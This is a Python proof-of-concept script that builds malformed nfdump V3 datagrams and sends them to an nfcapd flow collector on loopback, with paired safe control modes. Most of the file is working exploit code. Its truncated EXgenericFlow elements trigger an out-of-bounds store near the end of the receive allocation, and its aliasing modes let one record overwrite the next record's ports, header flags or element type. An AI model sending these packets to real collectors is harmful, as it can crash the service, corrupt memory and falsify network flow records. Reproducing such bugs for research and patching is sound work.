#!/usr/bin/env python3
"""Send a pinned nfdump V3 datagram to a loopback nfcapd.

Modes mirror harness/adjacent.c: 'attack' has a truncated EXgenericFlow
element (type 1, length 20), 'safe' has the complete 52-byte element, and
'icmp' adds packet-chosen bytes that trigger the pinned ICMP port swap.
'single' is the 48-byte one-record datagram from harness/driver.c.
'alias'/'alias-safe' put the swapped bytes in a later processed record.
'edge' is a maximum-size IPv4 UDP datagram whose last element is a
zero-length EXgenericFlow, placing the OOB store nearest the 65535-byte
receive allocation's end.
"""
import argparse
import socket
import struct

VERSION_NFDUMP = 250
V3_RECORD = 11
EX_GENERIC_FLOW = 1
EX_SIZE = 52
REC_HDR = struct.Struct("<HHHBBHBB")  # 12 bytes, pinned recordHeaderV3_t
ELEM_HDR = struct.Struct("<HH")       # 4 bytes, pinned elementHeader_t
NFD_HDR = struct.Struct(">HHIII")     # 16 bytes, pinned nfd_header_t (network order)
DUMMY_TYPE = 42       # < MAXEXTENSIONS (43); not generic flow or received IP
DUMMY_LEN = 8         # includes the 4-byte element header
ALIAS_SRC_PORT = 0x1234


def record(elem_len, payload, nfversion=3, exporter_id=0):
    """One V3 record with a single EXgenericFlow element."""
    return (REC_HDR.pack(V3_RECORD, REC_HDR.size + elem_len, 1,
                         0, 0, exporter_id, 0, nfversion)
            + ELEM_HDR.pack(EX_GENERIC_FLOW, elem_len) + payload)


def generic_flow(in_packets, in_bytes, proto=6):
    p = bytearray(EX_SIZE - 4)
    struct.pack_into("<Q", p, 24, in_packets)  # inPackets
    struct.pack_into("<Q", p, 32, in_bytes)    # inBytes
    p[44] = proto
    return bytes(p)


def alias_datagram(first):
    """Record 1's truncated element aliases record 2's payload.

    Record 1 has a truncated flow element (length 20) plus one 8-byte dummy
    element, so its size is 40 and record 2 starts at record1+40. The
    truncated element's EXgenericFlow view then sees record 2's payload at
    offsets 0 (srcPort), 2 (dstPort) and 4 (proto). The ICMP swap writes
    packet-chosen srcPort bytes into record 2's dstPort, which is copied
    and processed later in the same Process_nfd loop. The msecReceived OOB
    store at payload+16 lands on record 1's own dummy element, leaving
    record 2's header intact — unlike the earlier alias attempt.
    """
    victim_payload = bytearray(generic_flow(5, 500))
    victim_payload[0:2] = struct.pack("<H", ALIAS_SRC_PORT)  # swap source
    victim_payload[2:4] = b"\x00\x00"                       # dstPort before
    victim_payload[4] = 1                                    # ICMP seen by rec 1
    victim = record(EX_SIZE, bytes(victim_payload))

    if first == "attack":
        elems = ((EX_GENERIC_FLOW, 20, b"\x11" * 16),
                 (DUMMY_TYPE, DUMMY_LEN, bytes(DUMMY_LEN - 4)))
    else:
        p = bytearray(generic_flow(3, 180))
        p[40:42] = struct.pack("<H", ALIAS_SRC_PORT)
        elems = ((EX_GENERIC_FLOW, EX_SIZE, bytes(p)),)

    body = REC_HDR.pack(V3_RECORD, REC_HDR.size + sum(e[1] for e in elems),
                        len(elems), 0, 0, 0, 0, 3)
    for etype, elen, payload in elems:
        body += ELEM_HDR.pack(etype, elen) + payload
    body += victim
    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                        1764000000, 1, 2) + body


HDR_EXPORTER_ID = 0xAB03  # high byte lands in victim flags, low in nfversion


def hdr_datagram(first):
    """Aim the pinned ICMP swap at record 2's V3 header flags/nfversion.

    Record 1 is 48 bytes: 12-byte header + truncated EXgenericFlow (20) +
    16-byte dummy element. Its flow view sees srcPort at record1+56,
    dstPort at record1+58 and proto at record1+60. Record 2 starts at
    record1+48, so those offsets are its exporterID (8..9), flags/nfversion
    (10..11) and element type (12). The element type low byte is 1 (ICMP),
    so the pinned swap copies the chosen exporterID bytes into flags and
    nfversion, then zeros exporterID -- before record 2 is verified,
    copied and written to the capture.
    """
    victim_payload = generic_flow(5, 500)
    victim = record(EX_SIZE, victim_payload, exporter_id=HDR_EXPORTER_ID)

    if first == "attack":
        elems = ((EX_GENERIC_FLOW, 20, b"\x11" * 16),
                 (DUMMY_TYPE, 16, bytes(12)))
    else:
        elems = ((EX_GENERIC_FLOW, EX_SIZE, generic_flow(3, 180)),)

    body = REC_HDR.pack(V3_RECORD, REC_HDR.size + sum(e[1] for e in elems),
                        len(elems), 0, 0, 0, 0, 3)
    for etype, elen, payload in elems:
        body += ELEM_HDR.pack(etype, elen) + payload
    body += victim
    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                        1764000000, 1, 2) + body


ETYPE_BAD = 43        # >= MAXEXTENSIONS: VerifyV3Record rejects this type
ETYPE_LEN = 257       # low byte 1 -> pinned genericFlow->proto == IPPROTO_ICMP


def etype_datagram(first, nfversion=1):
    """Aim the pinned ICMP swap at record 2's ELEMENT TYPE.

    Record 1 is 46 bytes: 12-byte header + truncated EXgenericFlow (20) +
    14-byte dummy. Its flow view starts at record1+16, so srcPort lands at
    record2+10 (record 2 flags/nfversion), dstPort at record2+12 (the
    element type) and proto at record2+14 (element length low byte, 1).
    The pinned swap byte-swaps flags/nfversion into the element type and
    zeroes flags/nfversion. Record 2's wire element type is always 43
    (rejected); only the crossing write can make it 1 (accepted).
    """
    flow = bytearray(generic_flow(5, 500))
    flow.extend(bytes(ETYPE_LEN - ELEM_HDR.size - len(flow)))
    victim = (REC_HDR.pack(V3_RECORD, REC_HDR.size + ETYPE_LEN,
                           1, 0, 0, 0, 0, nfversion)
              + ELEM_HDR.pack(ETYPE_BAD, ETYPE_LEN) + bytes(flow))

    if first == "attack":
        elems = ((EX_GENERIC_FLOW, 20, b"\x11" * 16),
                 (DUMMY_TYPE, 14, bytes(10)))
    else:
        elems = ((EX_GENERIC_FLOW, EX_SIZE, generic_flow(3, 180)),)

    body = REC_HDR.pack(V3_RECORD, REC_HDR.size + sum(e[1] for e in elems),
                        len(elems), 0, 0, 0, 0, 3)
    for etype, elen, p in elems:
        body += ELEM_HDR.pack(etype, elen) + p
    body += victim
    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                        1764000000, 1, 2) + body


def edge_datagram():
    """Fill a maximum IPv4 UDP payload (65507 B) with a 4-byte flow element last.

    Layout: 16 B nfd header + 12 B record header + a 65475 B dummy element
    + a 4 B header-only EXgenericFlow element = 65507 B.  VerifyV3Record()
    accepts length 4 (it consumes its own header); GetExtension() returns
    payload = in_buff + 65507, so the msecReceived store at payload+16
    lands at 65523..65530 -- four bytes inside the 65535-byte malloc at
    nfcapd.c:273.  Reads of later struct fields (inPackets at +24) cross
    the allocation.
    """
    dummy_len = 65475
    body = REC_HDR.pack(V3_RECORD, REC_HDR.size + dummy_len + 4,
                        2, 0, 0, 0, 0, 3)
    body += ELEM_HDR.pack(DUMMY_TYPE, dummy_len) + bytes(dummy_len - 4)
    body += ELEM_HDR.pack(EX_GENERIC_FLOW, 4)
    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                        1764000000, 1, 1) + body


def edge_safe_datagram():
    """Same 65507-byte size with a complete 52-byte EXgenericFlow last."""
    dummy_len = 65427
    body = REC_HDR.pack(V3_RECORD, REC_HDR.size + dummy_len + EX_SIZE,
                        2, 0, 0, 0, 0, 3)
    body += ELEM_HDR.pack(DUMMY_TYPE, dummy_len) + bytes(dummy_len - 4)
    body += ELEM_HDR.pack(EX_GENERIC_FLOW, EX_SIZE) + generic_flow(3, 180)
    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                        1764000000, 1, 1) + body


def datagram(mode):
    if mode in ("alias", "alias-safe"):
        return alias_datagram("attack" if mode == "alias" else "safe")
    if mode in ("hdr", "hdr-safe"):
        return hdr_datagram("attack" if mode == "hdr" else "safe")
    if mode in ("etype", "etype-bad", "etype-safe"):
        return etype_datagram(
            "safe" if mode == "etype-safe" else "attack",
            43 if mode == "etype-bad" else 1)
    if mode == "edge":
        return edge_datagram()
    if mode == "edge-safe":
        return edge_safe_datagram()

    if mode == "single":
        body = record(20, b"\x41" * 16)
        count = 1

    else:
        if mode == "safe":
            elem_len = EX_SIZE
            payload = generic_flow(3, 180)
        else:
            elem_len = 20
            payload = bytearray(b"\x11" * 16)
            if mode == "icmp":
                # Aliased with the next record's payload bytes 8..12 in the
                # 64 KiB receive buffer: srcPort/dstPort/proto of the short
                # element's EXgenericFlow view.
                payload[8:13] = bytes((0xde, 0xad, 0x5a, 0x5a, 1))
            payload = bytes(payload)
        body = record(elem_len, payload) + record(EX_SIZE, generic_flow(5, 500))
        count = 2
    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                        1764000000, 1, count) + body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("port", type=int)
    ap.add_argument("mode", choices=("attack", "safe", "icmp", "single",
                                     "alias", "alias-safe", "hdr", "hdr-safe",
                                     "edge", "edge-safe",
                                     "etype", "etype-bad", "etype-safe"))
    a = ap.parse_args()
    pkt = datagram(a.mode)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(pkt, ("127.0.0.1", a.port))
    s.close()
    r2 = NFD_HDR.size + REC_HDR.size + 20 if a.mode in ("attack", "icmp") else None
    if r2 is not None:
        print("R2_HDR_BEFORE=" + pkt[r2:r2 + 8].hex())
    print("WIRE_MODE=%s WIRE_LEN=%d" % (a.mode, len(pkt)))

if __name__ == "__main__":
    main()
